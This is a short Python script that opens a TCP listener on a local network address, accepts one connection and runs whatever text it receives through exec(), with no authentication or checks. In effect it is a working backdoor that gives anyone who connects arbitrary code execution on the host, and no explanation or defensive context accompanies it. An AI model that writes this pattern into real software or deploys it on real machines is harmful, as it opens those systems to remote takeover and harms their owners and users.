import socket
def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("192.168.1.67", 65432))
    server_socket.listen()
    print("Server is listening for connections...")
    conn, addr = server_socket.accept()
    print(f"Connected by {addr}")
    data = conn.recv(1024)
    print(f"Received message: {exec(data.decode())}")
    conn.close()


if __name__ == "__main__":
    start_server()
